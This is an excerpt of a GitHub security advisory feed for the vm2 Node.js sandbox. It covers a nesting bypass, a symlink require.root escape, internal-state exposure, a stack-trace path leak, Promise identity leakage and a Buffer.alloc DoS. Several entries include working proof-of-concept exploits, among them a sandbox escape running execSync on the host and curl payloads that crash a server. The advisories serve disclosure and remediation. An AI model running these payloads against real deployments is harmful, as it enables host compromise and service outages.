<p>Narrow builtin allowlists are also bypassed. <code>require: { builtin: ['path'] }</code> still allows <code>require('vm2')</code> when nesting is enabled.</p>
<h3 id="impact">Impact</h3>
<p><strong>Who is affected:</strong> Any application that runs untrusted or user-supplied code inside a <code>NodeVM</code> with <code>nesting: true</code>. This includes multi-tenant code execution platforms, notebook/REPL services, plugin systems, and CI sandboxing tools that use vm2.</p>
<p><strong>What an attacker can do:</strong> Execute arbitrary OS commands as the host process user. From there: read/write files, exfiltrate secrets from the environment, move laterally on the host network, or establish persistence.</p>
<p><strong>Severity:</strong> The mental model mismatch is the core danger. A developer who sets <code>require: false</code> to lock down modules, then adds <code>nesting: true</code> to allow child VM creation, will believe the sandbox is restricted. It is not — <code>require: false</code> is silently overridden and the sandbox has unrestricted OS access.</p>
<p><strong>Note:</strong> <code>nesting: true</code> must be set by the host. This is not a zero-cooperation escape from a default <code>NodeVM</code>. However, it is not pure misconfiguration either: the implementation defeats a strong and reasonable expectation (<code>require: false</code> should mean deny all), and the existing warning in the docs does not surface the <code>require: false</code> bypass specifically.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-8hg8-63c5-gwmx">https://github.com/patriksimek/vm2/security/advisories/GHSA-8hg8-63c5-gwmx</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.1">https://github.com/patriksimek/vm2/releases/tag/v3.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-8hg8-63c5-gwmx">https://github.com/advisories/GHSA-8hg8-63c5-gwmx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hg8-63c5-gwmx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T05:13:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 has a NodeVM require.root bypass via symlink traversal that allows sandbox escape]]></title>
        <id>https://github.com/advisories/GHSA-cp6g-6699-wx9c</id>
        <link href="https://github.com/advisories/GHSA-cp6g-6699-wx9c"/>
        <updated>2026-05-07T04:33:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>NodeVM's <code>require.root</code> path restriction can be bypassed using filesystem symlinks, allowing sandboxed code to load modules from outside the allowed root directory in host context. Because path validation uses <code>path.resolve()</code> (which does not dereference symlinks) but module loading uses Node's native <code>require()</code> (which does), an attacker can load arbitrary host-realm modules and achieve remote code execution.</p>
<h2 id="severity">Severity</h2>
<p><strong>High</strong> (CVSS 3.1: 8.5)</p>
<p><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H</code></p>
<ul>
<li><strong>Attack Vector:</strong> Network — sandboxed code is typically received from external sources (user-submitted scripts, plugin code)</li>
<li><strong>Attack Complexity:</strong> High — requires symlinks inside the allowed root that point outside it; common with pnpm, npm workspaces, and npm link but not guaranteed in all deployments</li>
<li><strong>Privileges Required:</strong> Low — attacker needs only the ability to submit code to the sandbox, which is the intended use case</li>
<li><strong>User Interaction:</strong> None</li>
<li><strong>Scope:</strong> Changed — the vulnerability is in the sandbox boundary; impact is on the host system</li>
<li><strong>Confidentiality Impact:</strong> High — arbitrary file read via host command execution</li>
<li><strong>Integrity Impact:</strong> High — arbitrary command execution on the host</li>
<li><strong>Availability Impact:</strong> High — arbitrary command execution on the host</li>
</ul>
<h2 id="affected-component">Affected Component</h2>
<ul>
<li><code>lib/resolver-compat.js</code> — <code>CustomResolver.isPathAllowed()</code> (line 53-60)</li>
<li><code>lib/resolver-compat.js</code> — <code>CustomResolver.loadJS()</code> (line 62-66)</li>
<li><code>lib/filesystem.js</code> — <code>DefaultFileSystem.resolve()</code> (line 8-10)</li>
</ul>
<h2 id="cwe">CWE</h2>
<ul>
<li><strong>CWE-59</strong>: Improper Link Resolution Before File Access</li>
</ul>
<h2 id="description">Description</h2>
<h3 id="root-cause-checkuse-path-discrepancy">Root Cause: Check/Use Path Discrepancy</h3>
<p>The <code>isPathAllowed</code> method validates whether a resolved filename falls within the allowed root paths using a string-prefix check:</p>
<pre><code class="language-js">// lib/resolver-compat.js:53-60
isPathAllowed(filename) {
    return this.rootPaths === undefined || this.rootPaths.some(path =&gt; {
        if (!filename.startsWith(path)) return false;
        const len = path.length;
        if (filename.length === len || (len &gt; 0 &amp;&amp; this.fs.isSeparator(path[len-1]))) return true;
        return this.fs.isSeparator(filename[len]);
    });
}
</code></pre>
<p>The filename passed to this check is resolved via <code>DefaultFileSystem.resolve()</code>, which uses <code>path.resolve()</code>:</p>
<pre><code class="language-js">// lib/filesystem.js:8-10
resolve(path) {
    return pa.resolve(path);
}
</code></pre>
<p><code>path.resolve()</code> normalizes the path (resolves <code>.</code>, <code>..</code>, and makes it absolute) but does <strong>NOT</strong> dereference symlinks. A symlink at <code>/root/node_modules/safe</code> pointing to <code>/outside/root/malicious</code> resolves to <code>/root/node_modules/safe</code> — passing the prefix check.</p>
<p>However, the actual module loading uses Node's native <code>require()</code>, which <strong>does</strong> follow symlinks:</p>
<pre><code class="language-js">// lib/resolver-compat.js:62-66
loadJS(vm, mod, filename) {
    if (this.pathContext(filename, 'js') !== 'host') return super.loadJS(vm, mod, filename);
    const m = this.hostRequire(filename);
    mod.exports = vm.readonly(m);
}
</code></pre>
<h3 id="no-symlink-defenses-exist">No Symlink Defenses Exist</h3>
<p>A search for <code>realpath</code>, <code>readlink</code>, <code>lstat</code>, or any symlink-aware function across the entire <code>lib/</code> directory returns zero results. Neither <code>DefaultFileSystem</code> nor <code>VMFileSystem</code> provides a realpath method. The root paths themselves are also resolved without dereferencing symlinks:</p>
<pre><code class="language-js">// lib/resolver-compat.js:218
const checkedRootPaths = rootPaths ? (Array.isArray(rootPaths) ? rootPaths : [rootPaths]).map(f =&gt; fsOpt.resolve(f)) : undefined;
</code></pre>
<h3 id="full-execution-chain">Full Execution Chain</h3>
<ol>
<li>Host creates <code>NodeVM</code> with <code>require: { external: ['safe'], root: '/tmp/root', context: 'host' }</code></li>
<li>A symlink exists: <code>/tmp/root/node_modules/safe</code> → <code>/outside/root/vm2/</code> (e.g., via pnpm, npm link, or workspaces)</li>
<li>Sandbox code calls <code>require('safe')</code></li>
<li><code>DefaultResolver.resolveFull()</code> resolves to <code>/tmp/root/node_modules/safe/index.js</code></li>
<li><code>tryFile()</code> calls <code>this.fs.resolve(x)</code> → <code>path.resolve()</code> → <code>/tmp/root/node_modules/safe/index.js</code> (symlink NOT followed)</li>
<li><code>isPathAllowed()</code> checks if path starts with <code>/tmp/root/</code> → <strong>PASSES</strong></li>
<li><code>loadJS()</code> detects <code>context: 'host'</code>, calls <code>this.hostRequire(filename)</code></li>
<li>Node's <code>require()</code> follows the symlink, loads from <code>/outside/root/vm2/index.js</code></li>
<li>Module executes in host realm; exports proxied to sandbox</li>
<li>Sandbox uses loaded module to escalate (e.g., creates a new privileged NodeVM with <code>child_process</code>)</li>
</ol>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-js">const path = require('path');
const fs = require('fs');
const os = require('os');
const { NodeVM } = require('vm2');

// Create an "allowed" root directory
const root = fs.mkdtempSync(path.join(os.tmpdir(), 'vm2-root-'));
fs.mkdirSync(path.join(root, 'node_modules'), { recursive: true });

// Symlink inside root pointing to vm2 package outside root
// In real deployments: pnpm, npm link, workspaces create these automatically
const link = path.join(root, 'node_modules', 'safe');
fs.symlinkSync(path.resolve(__dirname), link, 'dir');

const vm = new NodeVM({
  require: {
    external: ['safe'],
    root,
    context: 'host',
    builtin: [],       // no builtins allowed
  },
});

// Sandbox code loads vm2 from outside root via symlink,
// creates a privileged inner NodeVM to get child_process
const out = vm.run(`
  const { NodeVM } = require('safe');
  const inner = new NodeVM({ require: { builtin: ['child_process'] } });
  module.exports = inner.run(
    "module.exports = require('child_process').execSync('id').toString()",
    'inner.js'
  );
`, path.join(root, 'vm.js'));

console.log(out.trim()); // prints host uid/gid — RCE achieved
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Sandbox escape</strong>: Untrusted sandboxed code can load arbitrary modules from outside the allowed root directory in host context.</li>
<li><strong>Remote code execution</strong>: By loading vm2 itself (or any module with dangerous capabilities), the attacker can execute arbitrary commands on the host system.</li>
<li><strong>Bypasses <code>require.root</code> entirely</strong>: The root restriction — the primary defense against module loading attacks — provides no protection when symlinks are present.</li>
<li><strong>Common in production</strong>: pnpm (where ALL <code>node_modules</code> are symlinks), npm workspaces, and <code>npm link</code> all create the symlink conditions required for exploitation.</li>
<li><strong>Silent failure</strong>: No error or warning is raised when a symlink traverses outside the root.</li>
</ul>
<h2 id="recommended-remediation">Recommended Remediation</h2>
<h3 id="option-1-dereference-symlinks-with-fsrealpathsync-before-path-validation-preferred">Option 1: Dereference symlinks with <code>fs.realpathSync</code> before path validation (Preferred)</h3>
<p>Resolve symlinks before checking against root paths, so the validation operates on the actual filesystem location:</p>
<pre><code class="language-js">// lib/filesystem.js — add a realpath method
const fs = require('fs');

class DefaultFileSystem {
    resolve(path) {
        return pa.resolve(path);
    }

    realpath(path) {
        return fs.realpathSync(path);
    }
    // ... rest unchanged
}
</code></pre>
<pre><code class="language-js">// lib/resolver-compat.js — use realpath in isPathAllowed or before calling it
isPathAllowed(filename) {
    let realFilename;
    try {
        realFilename = this.fs.realpath(filename);
    } catch (e) {
        return false; // file doesn't exist or can't be resolved
    }
    return this.rootPaths === undefined || this.rootPaths.some(path =&gt; {
        if (!realFilename.startsWith(path)) return false;
        const len = path.length;
        if (realFilename.length === len || (len &gt; 0 &amp;&amp; this.fs.isSeparator(path[len-1]))) return true;
        return this.fs.isSeparator(realFilename[len]);
    });
}
</code></pre>
<p>Also dereference root paths at construction time:</p>
<pre><code class="language-js">// lib/resolver-compat.js:218
const checkedRootPaths = rootPaths ? (Array.isArray(rootPaths) ? rootPaths : [rootPaths]).map(f =&gt; {
    const resolved = fsOpt.resolve(f);
    try { return fs.realpathSync(resolved); } catch (e) { return resolved; }
}) : undefined;
</code></pre>
<p><strong>Tradeoff</strong>: <code>realpathSync</code> adds a syscall per path check. Cache results to minimize overhead.</p>
<h3 id="option-2-validate-the-realpath-in-makeextensionhandler--checkaccess">Option 2: Validate the realpath in <code>makeExtensionHandler</code> / <code>checkAccess</code></h3>
<p>Add a realpath check at the enforcement point in <code>Resolver.makeExtensionHandler</code>:</p>
<pre><code class="language-js">makeExtensionHandler(vm, name) {
    return (mod, filename) =&gt; {
        filename = this.fs.resolve(filename);
        // Dereference symlinks before access check
        try {
            const realFilename = fs.realpathSync(filename);
            if (realFilename !== filename) {
                // Filename was a symlink — validate the real path too
                this.checkAccess(mod, realFilename);
            }
        } catch (e) {
            throw new VMError(`Access denied to require '${filename}'`, 'EDENIED');
        }
        this.checkAccess(mod, filename);
        this[name](vm, mod, filename);
    };
}
</code></pre>
<p><strong>Tradeoff</strong>: Fixes it at a higher layer but doesn't protect custom resolvers that bypass <code>makeExtensionHandler</code>.</p>
<h2 id="credit">Credit</h2>
<p>This vulnerability was discovered and reported by <a href="https://bugbunny.ai">bugbunny.ai</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-cp6g-6699-wx9c">https://github.com/patriksimek/vm2/security/advisories/GHSA-cp6g-6699-wx9c</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cp6g-6699-wx9c">https://github.com/advisories/GHSA-cp6g-6699-wx9c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cp6g-6699-wx9c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T04:33:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2's Transformer Fast-Path Bypass Exposes Internal State Variable]]></title>
        <id>https://github.com/advisories/GHSA-wp5r-2gw5-m7q7</id>
        <link href="https://github.com/advisories/GHSA-wp5r-2gw5-m7q7"/>
        <updated>2026-05-07T04:32:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>vm2's code transformer has a performance optimization that skips AST analysis when the code does not contain <code>catch</code>, <code>import</code>, or <code>async</code> keywords. This fast-path bypass allows sandboxed code to directly access the internal <code>VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL</code> variable, which exposes internal security functions (<code>handleException</code>, <code>wrapWith</code>, <code>import</code>).</p>
<h3 id="details">Details</h3>
<p>In <code>lib/transformer.js:55-57</code>, a regex check <code>/\b(?:catch|import|async)\b/</code> determines whether AST transformation is needed. If the code does not contain any of these keywords, the transformer returns the code unmodified.</p>
<p>When the fast-path is taken:</p>
<ol>
<li><strong>INTERNAL_STATE_NAME identifier check is bypassed</strong>: The AST visitor that blocks access to <code>VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL</code> never runs</li>
<li><strong><code>with</code> statement instrumentation is bypassed</strong>: <code>with()</code> statements are not wrapped with <code>wrapWith()</code>, enabling scope manipulation</li>
<li>The internal state object exposes: <code>handleException(e)</code>, <code>wrapWith(x)</code>, <code>import(what)</code></li>
</ol>
<p>While these methods are currently defensive utilities (not direct escape vectors), this represents a complete bypass of a security control. Any future addition of a sensitive method to the internal state object would be immediately exploitable.</p>
<h3 id="poc">PoC</h3>
<p><strong>Library-level PoC (Node.js script — primary):</strong></p>
<pre><code class="language-javascript">const { VM } = require("vm2");
const vm = new VM();

// Access internal state (bypassed — no catch/import/async keywords)
const result = vm.run(`
  var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL;
  Object.keys(x).join(",")
`);
console.log(result); // "wrapWith,handleException,import"

// Control test — blocked when catch keyword is present
try {
  vm.run(`
    try {
      var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL;
    } catch(e) { e.message }
  `);
} catch(e) {
  console.log(e.message); // "Use of internal vm2 state variable"
}
</code></pre>
<p><strong>HTTP demonstration:</strong></p>
<pre><code class="language-bash"># Internal state access (bypassed)
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL; Object.keys(x).join(\",\")"}'
# Result: "wrapWith,handleException,import"

# Control test — blocked when catch keyword is present
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"try { var x = VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL; } catch(e) { e.message }"}'
# Result: {"errors":["Use of internal vm2 state variable"]}
</code></pre>
<p><strong>Suggested fix:</strong></p>
<pre><code class="language-javascript">// transformer.js:55 — add 'with' keyword and INTERNAL_STATE_NAME check
if (!/\b(?:catch|import|async|with)\b/.test(code) &amp;&amp; code.indexOf(INTERNAL_STATE_NAME) === -1) {
    return {__proto__: null, code, hasAsync: false};
}
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Security Control Bypass</strong>: The INTERNAL_STATE_NAME access restriction is completely ineffective when the code avoids 3 specific keywords.</li>
<li><strong>Defense-in-Depth Violation</strong>: Internal security functions are exposed, creating a latent attack surface for future code changes.</li>
<li><strong>Scope</strong>: All applications using vm2. No special configuration required.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-wp5r-2gw5-m7q7">https://github.com/patriksimek/vm2/security/advisories/GHSA-wp5r-2gw5-m7q7</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-wp5r-2gw5-m7q7">https://github.com/advisories/GHSA-wp5r-2gw5-m7q7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wp5r-2gw5-m7q7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T04:32:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 is Vulnerable to Host File Path Disclosure via Stack Trace Information Leak]]></title>
        <id>https://github.com/advisories/GHSA-v27g-jcqj-v8rw</id>
        <link href="https://github.com/advisories/GHSA-v27g-jcqj-v8rw"/>
        <updated>2026-05-07T04:30:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>vm2's <code>CallSite</code> wrapper class (intended as a safe wrapper for V8's native CallSite) blocks <code>getThis()</code> and <code>getFunction()</code> to prevent host object leakage, but allows <code>getFileName()</code> to return unsanitized host absolute paths. Any sandboxed code can extract the full directory structure, library paths, and framework versions of the host server.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/setup-sandbox.js:436-466</code>, the <code>CallSite</code> class overrides <code>getThis()</code> and <code>getFunction()</code> with <code>undefined</code> to prevent host object references from leaking into the sandbox. However, the following methods pass through unsanitized values from the original V8 CallSite object:</p>
<ul>
<li><code>getFileName()</code> — returns host absolute paths like <code>/app/node_modules/vm2/lib/vm.js</code></li>
<li><code>getLineNumber()</code>, <code>getColumnNumber()</code> — exact source locations</li>
<li><code>getFunctionName()</code>, <code>getMethodName()</code>, <code>getTypeName()</code> — internal function names</li>
</ul>
<p>Two exploitation paths exist:</p>
<ol>
<li><strong>Default <code>error.stack</code></strong>: <code>new Error().stack</code> includes host frame paths in the formatted string</li>
<li><strong>Custom <code>prepareStackTrace</code></strong>: Attacker can set <code>Error.prepareStackTrace</code> to directly call <code>getFileName()</code> on each CallSite, extracting a clean list of all host paths</li>
</ol>
<h3 id="poc">PoC</h3>
<p><strong>Library-level PoC (Node.js script — primary):</strong></p>
<pre><code class="language-javascript">const { VM } = require("vm2");
const vm = new VM();

// Path A — Default error.stack
const result1 = vm.run(`try { null.x; } catch(e) { e.stack }`);
console.log(result1);
// Output includes: /app/node_modules/vm2/lib/vm.js:289:18
//                   /app/src/server.js:49:20

// Path B — prepareStackTrace extraction
const result2 = vm.run(`
  Error.prepareStackTrace = function(e, sst) {
    return sst.map(function(s) { return s.getFileName(); }).join(", ");
  };
  new Error().stack
`);
console.log(result2);
// Output: vm.js, node:vm, /app/node_modules/vm2/lib/vm.js, /app/src/sandbox.js, ...
</code></pre>
<p><strong>HTTP demonstration:</strong></p>
<pre><code class="language-bash"># Default error.stack
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"try { null.x; } catch(e) { e.stack }"}'
# Result includes host paths: /app/src/server.js, /app/node_modules/express/...

# prepareStackTrace extraction
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"Error.prepareStackTrace = function(e, sst) { return sst.map(function(s) { return s.getFileName(); }).join(\", \"); }; new Error().stack"}'
# Result: /app/node_modules/vm2/lib/vm.js, /app/src/sandbox.js, /app/src/server.js, ...
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Information Disclosure</strong>: Host directory structure, library paths, framework versions, and internal architecture are exposed to sandboxed code.</li>
<li><strong>Attack Chain</strong>: Leaked paths enable precise targeting for other vulnerabilities.</li>
<li><strong>Scope</strong>: All applications using vm2. No special configuration required.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-v27g-jcqj-v8rw">https://github.com/patriksimek/vm2/security/advisories/GHSA-v27g-jcqj-v8rw</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-v27g-jcqj-v8rw">https://github.com/advisories/GHSA-v27g-jcqj-v8rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v27g-jcqj-v8rw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T04:30:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 Host Promise Resolution Preserves Object Identity Across Sandbox Boundary]]></title>
        <id>https://github.com/advisories/GHSA-mpf8-4hx2-7cjg</id>
        <link href="https://github.com/advisories/GHSA-mpf8-4hx2-7cjg"/>
        <updated>2026-05-07T04:29:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A sandbox boundary violation in <strong>vm2</strong> allows host object identity to cross into the sandbox through host Promise resolution.</p>
<p>When a host-side Promise that resolves to a host object is exposed to the sandbox, the value delivered to the sandbox <code>.then()</code> callback preserves host identity. This allows the sandbox to interact with the host object directly, including:</p>
<ul>
<li>Performing identity checks using host-side <code>WeakMap</code></li>
<li>Mutating host object state from inside the sandbox</li>
</ul>
<p>This behavior occurs because the Promise fulfillment wrapper uses <code>ensureThis()</code> instead of the stronger cross-realm conversion path (<code>from()</code> / proxy wrapping). If no prototype mapping is found, <code>ensureThis()</code> returns the original object.</p>
<p>As a result, objects resolved by host Promises can cross the sandbox boundary without proper isolation.</p>
<hr>
<h3 id="details">Details</h3>
<p>In <code>setup-sandbox.js</code>, vm2 wraps <code>Promise.prototype.then</code>:</p>
<pre><code class="language-js">globalPromise.prototype.then = function then(onFulfilled, onRejected) {
  resetPromiseSpecies(this);

  if (typeof onFulfilled === 'function') {
    const origOnFulfilled = onFulfilled;
    onFulfilled = function onFulfilled(value) {
      value = ensureThis(value);
      return apply(origOnFulfilled, this, [value]);
    };
  }

  return apply(globalPromiseThen, this, [onFulfilled, onRejected]);
};


The wrapper calls ensureThis(value) before invoking the sandbox callback.

However, ensureThis is implemented in bridge.js as thisEnsureThis():

function thisEnsureThis(other) {
  const type = typeof other;

  switch (type) {
    case 'object':
      if (other === null) return null;

    case 'function':
      let proto = thisReflectGetPrototypeOf(other);

      if (!proto) {
        return other;
      }

      while (proto) {
        const mapping = thisReflectApply(thisMapGet, protoMappings, [proto]);

        if (mapping) {
          const mapped = thisReflectApply(thisWeakMapGet, mappingOtherToThis, [other]);
          if (mapped) return mapped;
          return mapping(defaultFactory, other);
        }

        proto = thisReflectGetPrototypeOf(proto);
      }

      return other;

If no prototype mapping is found, ensureThis() simply returns the original object:

return other;

This means the sandbox receives the original host object instead of a proxied or sanitized representation.

Because of this behavior, values resolved by host Promises can cross the host–sandbox boundary with identity preserved.

PoC

The following Proof of Concept demonstrates that an object resolved by a host Promise can be used as a valid key in a host-side WeakMap from inside the sandbox.

WeakMap keys rely on reference identity, so a successful lookup proves that the sandbox received the host object identity.

PoC Code
import {VM} from "./index.js";

const hostObj = {tag: "HOST_OBJ"};
const hostPromise = Promise.resolve(hostObj);

// WeakMap created on the host
const wm = new WeakMap([[hostObj, "HIT"]]);

const vm = new VM({
  sandbox: {hostPromise, wm},
  timeout: 1000,
  eval: false,
  wasm: false,
});

const code = `
  hostPromise.then(v =&gt; ({
    weakMapGet: wm.get(v),
    typeofV: typeof v,
    tag: v.tag
  }))
`;

const result = await vm.run(code);

console.log("VM RESULT:", result);
console.log("HOST SAME KEY STILL:", wm.get(hostObj));
Output
VM RESULT: { weakMapGet: 'HIT', typeofV: 'object', tag: 'HOST_OBJ' }
HOST SAME KEY STILL: HIT

This confirms that the object delivered to the sandbox callback retains host identity.

Additional Demonstration: Host Object Mutation

The sandbox can also mutate host object state through the resolved Promise value.

import {VM} from "./index.js";

const hostObj = {tag: "HOST_OBJ", nested: {x: 1}};
const hostPromise = Promise.resolve(hostObj);

const vm = new VM({
  sandbox: {hostPromise},
  timeout: 1000,
  eval: false,
  wasm: false,
});

const code = `
  hostPromise.then(v =&gt; {
    v.nested.x = 999;
    v.tag = "MUTATED";
    return { seenTag: v.tag, seenX: v.nested.x };
  })
`;

const result = await vm.run(code);

console.log("VM RESULT:", result);
console.log("HOST AFTER:", hostObj);

**Output:**
VM RESULT: { seenTag: 'MUTATED', seenX: 999 }
HOST AFTER: { tag: 'MUTATED', nested: { x: 999 } }

This demonstrates write-through mutation of a host object from sandbox code.

**Impact**
This vulnerability allows host object references to cross the vm2 sandbox boundary via Promise resolution.

Consequences include:

Host object identity disclosure

Write-through mutation of host objects

WeakMap / WeakSet identity oracle across the boundary

Potential capability leaks if sensitive host objects are reachable via Promises

Applications that expose host Promises to sandboxed code may unintentionally grant the sandbox direct access to host objects.

This weakens the intended isolation guarantees of vm2.
### References

- &lt;https://github.com/patriksimek/vm2/security/advisories/GHSA-mpf8-4hx2-7cjg&gt;
- &lt;https://github.com/patriksimek/vm2/releases/tag/v3.11.0&gt;
- &lt;https://github.com/advisories/GHSA-mpf8-4hx2-7cjg&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mpf8-4hx2-7cjg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T04:29:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 Sandbox Access to Host Buffer.alloc Allows timeout Bypass Resulting in Memory Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-6785-pvv7-mvg7</id>
        <link href="https://github.com/advisories/GHSA-6785-pvv7-mvg7"/>
        <updated>2026-05-07T04:26:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Sandboxed code can call <code>Buffer.alloc()</code> with an arbitrary size to allocate memory directly on the host heap. Because <code>Buffer.alloc</code> is a synchronous C++ native call, vm2's <code>timeout</code> option cannot interrupt it. A single request can exhaust host memory and crash the process with a <code>FATAL ERROR: Reached heap limit</code>.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/vm.js:58</code>, <code>Buffer</code> is exposed to the sandbox through the <code>HOST</code> object. The bridge proxy (<code>lib/bridge.js</code>) passes <code>Buffer.alloc()</code> calls to the host without any size validation.</p>
<p>Key technical distinction from regular JavaScript memory exhaustion (e.g., <code>while(true) a.push(...)</code>):</p>
<ul>
<li><strong>JavaScript loops</strong>: V8 can interrupt via timeout — vm2's <code>timeout</code> option works</li>
<li><strong><code>Buffer.alloc(N)</code></strong>: Executes as a single synchronous C++ call — V8 timeout has no opportunity to interrupt</li>
</ul>
<p>This means:</p>
<ol>
<li><code>timeout: 5000</code> does NOT protect against this attack</li>
<li>A single call allocates the entire requested size at once</li>
<li>In memory-constrained environments (Docker, Lambda, Kubernetes pods), this causes immediate OOM crash</li>
</ol>
<p>Tested amplification factor: ~100 bytes HTTP request — 1,000,000:1 or greater (100 bytes request to 100MB+ host heap allocation).</p>
<h3 id="poc">PoC</h3>
<p><strong>Library-level PoC (Node.js script — primary):</strong></p>
<pre><code class="language-javascript">const { VM } = require("vm2");
const vm = new VM({ timeout: 5000 });

// Buffer.alloc bypasses timeout — allocates 100MB on host heap
const result = vm.run(`Buffer.alloc(1024*1024*100).length`);
console.log(result); // 104857600 — timeout had no effect

// Control test — JavaScript loop IS caught by timeout
try {
  vm.run(`var a=[]; while(true) a.push(1)`);
} catch(e) {
  console.log(e.message); // "Script execution timed out after 5000ms"
}
</code></pre>
<p><strong>HTTP demonstration (OOM crash):</strong></p>
<pre><code class="language-bash"># 1. Confirm server is running
curl -s http://localhost:3000/api/execute \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"\"alive\""}'
# =&gt; {"result":"\"alive\""}

# 2. Send Buffer.alloc payload — process crashes with OOM
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"Buffer.alloc(1024*1024*100).length"}'
# =&gt; empty response (process died)

# 3. Check server logs:
# FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory

# Control test — JavaScript loop IS caught by timeout:
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"var a=[]; while(true) a.push(1)"}'
# =&gt; {"errors":["Script execution timed out after 5000ms"]}
# Server stays alive — timeout works for JS, but NOT for Buffer.alloc
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>DoS</strong>: A single HTTP request crashes the host Node.js process via OOM. The <code>timeout</code> option provides no protection.</li>
<li><strong>Environment-dependent severity</strong>:<ul>
<li><strong>Memory-constrained environments</strong> (Docker with memory limits, Kubernetes pods, Lambda): The allocation exceeds the memory limit, causing immediate process termination via OOM. This is the primary threat scenario — <code>FATAL ERROR: Reached heap limit</code> was confirmed in testing.</li>
<li><strong>Unconstrained environments</strong>: The allocation succeeds and memory is reclaimed by GC after the request completes, resulting in temporary performance degradation rather than a crash.</li>
</ul>
</li>
<li><strong>Scope</strong>: All applications using vm2. Default configuration is vulnerable. Memory-constrained environments (Docker, Kubernetes, Lambda) are most severely impacted.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-6785-pvv7-mvg7">https://github.com/patriksimek/vm2/security/advisories/GHSA-6785-pvv7-mvg7</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-6785-pvv7-mvg7">https://github.com/advisories/GHSA-6785-pvv7-mvg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6785-pvv7-mvg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T04:26:39.000Z</published>
